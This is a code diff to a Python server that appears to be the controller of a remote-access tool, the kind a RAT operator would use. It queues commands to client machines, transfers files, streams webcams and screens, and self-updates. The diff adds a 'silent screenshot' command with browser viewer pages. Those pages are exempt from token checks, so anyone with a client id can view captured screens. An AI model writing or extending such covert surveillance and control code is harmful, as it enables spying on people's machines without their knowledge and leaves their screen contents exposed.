@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.1.3"
+VERSION = "3.1.4"
 
 # ── Auth ─────────────────────────────────────────────────────────────────────
 # Set TOKEN to any hard-to-guess string (e.g. a random UUID).
@@ -38,6 +38,7 @@ camera_last_frame_at = {}
 camera_start_times = {}
 streaming_clients = set()
 pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch
+capture_frames = {}  # client_id -> (jpeg_bytes, timestamp) for single screenshot
 
 
 def get_or_create_client(client_id):
@@ -173,7 +174,7 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
         path   = parsed.path
         # Browser-facing viewer pages cannot send custom headers — exempt them.
-        if path not in ("/camera_view", "/camera_snapshot"):
+        if path not in ("/camera_view", "/camera_snapshot", "/capture_view", "/capture_snapshot"):
             if not self._check_token():
                 self._respond(403, b"forbidden")
                 return
@@ -326,6 +327,60 @@ class Handler(BaseHTTPRequestHandler):
             self.send_header("Connection", "close")
             self.end_headers()
             self.wfile.write(body)
+
+        elif path == "/capture_snapshot":
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                entry = capture_frames.get(client_id)
+            if not entry:
+                self._respond(204, b"")
+                return
+            frame, ts = entry
+            self.send_response(200)
+            self.send_header("Content-Type", "image/jpeg")
+            self.send_header("Content-Length", str(len(frame)))
+            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+            self.send_header("Connection", "close")
+            self.end_headers()
+            self.wfile.write(frame)
+
+        elif path == "/capture_view":
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                entry = capture_frames.get(client_id)
+            if not entry:
+                body = b"<html><body style='background:#111;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0'><p>No screenshot yet. Run <b>capture</b> again.</p></body></html>"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                self.send_header("Connection", "close")
+                self.end_headers()
+                self.wfile.write(body)
+                return
+            frame, ts = entry
+            import datetime
+            taken = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
+            html = f"""<!DOCTYPE html>
+<html><head><meta charset=utf-8><title>Screenshot \u2014 {client_id}</title>
+<style>
+  body{{margin:0;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;font-family:monospace;color:#0f0}}
+  img{{max-width:100%;max-height:92vh;border:1px solid #333;display:block}}
+  p{{font-size:12px;margin:6px 0 0;opacity:.6}}
+</style></head><body>
+  <img src='/capture_snapshot?id={client_id}' alt='screenshot'>
+  <p>{client_id} \u2014 captured {taken}</p>
+</body></html>"""
+            body = html.encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.send_header("Connection", "close")
+            self.end_headers()
+            self.wfile.write(body)
         else:
             self._respond(404)
 
@@ -434,6 +489,16 @@ class Handler(BaseHTTPRequestHandler):
                 streaming_clients.add(client_id)
             self._respond(200, b"ok")
 
+        elif path == "/capture_frame":
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                client = get_or_create_client(client_id)
+                client["last_checkin"] = time.time()
+                capture_frames[client_id] = (raw_body_bytes, time.time())
+            self._respond(200, b"ok")
+
         else:
             self._respond(404)
 
@@ -505,6 +570,7 @@ def input_loop():
             "exit",
             "stream",
             "stopstream",
+            "capture",
         }
         BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ", "put ")
         is_builtin = stripped in BUILTINS or any(
@@ -690,8 +756,9 @@ def input_loop():
             print(
                 "    put <filepath>    Upload local file to client's script dir (abs or relative)"
             )
-            print("    stream            Start webcam streaming on client")
+            print("    stream            Start webcam/screen streaming on client")
             print("    stopstream        Stop webcam streaming")
+            print("    capture           Take a silent screenshot, view in browser")
             print("    version           Show client version, host, PID")
             print("    update            Force self-update from GitHub now")
             print("    gui:<cmd>         Launch GUI on user's desktop")
@@ -757,6 +824,26 @@ def input_loop():
             print(f"[*] Camera stream started on {active_client}")
             print(f"[*] View at: http://localhost:4444/camera_view?id={active_client}")
             print("[*] Waiting for client to connect...")
+            continue
+
+        if stripped == "capture":
+            with lock:
+                if not active_client:
+                    print("[*] No active client. Use 'use <id>' to select one.")
+                    continue
+                client = clients.get(active_client)
+                if not client:
+                    print(f"[!] Client {active_client} not found.")
+                    continue
+                if client["command_running"]:
+                    print(f"[!] Command already running on {active_client}. Cancel first.")
+                    continue
+                client["pending_stdin"] = []
+                client["pending_command"] = "capture"
+                client["cmd_event"].set()
+                client["command_running"] = True
+            print(f"[*] Screenshot requested from {active_client}...")
+            print(f"[*] View at: http://localhost:4444/capture_view?id={active_client}")
             continue
 
         if stripped == "stopstream":
